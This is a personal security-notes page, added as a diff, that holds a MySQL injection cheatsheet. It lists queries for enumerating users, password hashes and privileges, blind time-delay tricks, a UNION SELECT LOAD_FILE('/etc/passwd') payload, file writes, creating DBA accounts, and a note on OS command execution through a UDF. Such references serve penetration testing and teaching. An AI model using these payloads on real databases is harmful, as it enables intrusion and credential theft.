@@ -1,0 +1,54 @@
+<title>kyli0x.mysqli</title><link rel="icon" href="../fav.ico"><link rel="stylesheet" href="../style.css"><pre>
+<h2><sub><sup><a href="../index.html">home</a>/<a href="index.html">kbs</a></sup></sub><br>mysql injection</h2><code>
+
+<h3> mysql injection cheatsheet
+
+Some of the queries in the table below can only be run by an admin. They are marked with </code>- priv<code> at the end of each query </code># this also covers my MS Access cheatsheet
+
+  version              :: SELECT @@version
+  comments             :: SELECT 1; #comment
+                       :: SELECT /*comment*/1;
+  current user         :: SELECT user();
+                       :: SELECT system_user();
+  list users           :: SELECT user FROM mysql.user; — priv
+  list password hashes :: SELECT host, user, password FROM mysql.user; — priv
+  password cracker     :: John the Ripper will crack MySQL password hashes
+  list privileges      :: SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; — list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; — priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; — list privs on columns
+
+  list dba accounts    :: SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; # priv
+  current database     :: SELECT database()
+  list databases       :: SELECT schema_name FROM information_schema.schemata; — for MySQL >= v5.0
+                       :: SELECT distinct(db) FROM mysql.db — priv
+  list columns         :: SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
+  list tables          :: SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
+  find tables from column name :: SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’
+                       :: Select Nth Row 	SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0
+                       :: SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0
+  select nth char      :: SELECT substr(‘abcd’, 3, 1); # returns c
+  bitwise AND          :: SELECT 6 & 2; # returns 2
+                       :: SELECT 6 & 1; # returns 0
+  ASCII value -> char  :: SELECT char(65); # returns A
+  char -> ASCII value  :: SELECT ascii(‘A’); # returns 65
+  casting              :: SELECT cast(’1′ AS unsigned integer);
+                       :: SELECT cast(’123′ AS char);
+  string concatenation :: SELECT CONCAT(‘A’,'B’); #returns AB
+                       :: SELECT CONCAT(‘A’,'B’,'C’); # returns ABC
+  if statement         :: SELECT if(1=1,’foo’,'bar’); — returns ‘foo’
+  case statement       :: SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns A
+  avoiding quotes      :: SELECT 0×414243; # returns ABC
+  time delay           :: SELECT BENCHMARK(1000000,MD5(‘A’));
+                       :: SELECT SLEEP(5); # >= 5.0.12
+  make DNS requests    :: impossible..?
+  command execution    :: if mysqld (<5.0) is running as root AND you compromise a dba account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).  the .so file should contain a User Defined Function (UDF).  raptor_udf.c explains exactly how you go about this.  Remember to compile for the target architecture which may or may not be the same as your attack platform.
+  local file access    :: …’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) — priv, can only read world-readable files.
+                       :: SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system
+  hostname, IP address :: SELECT @@hostname;
+  create users         :: CREATE USER test1 IDENTIFIED BY ‘pass1′; — priv
+  delete users         :: DROP USER test1; — priv
+  make user dba        :: GRANT ALL PRIVILEGES ON *.* TO test1@’%'; — priv
+  location of db files :: SELECT @@datadir;
+  default/system dbs :: information_schema (>= mysql 5.0)
+mysql</code>
+
+
+<footer>&copy; 2022⌜&iexcl;kyli0x</footer>
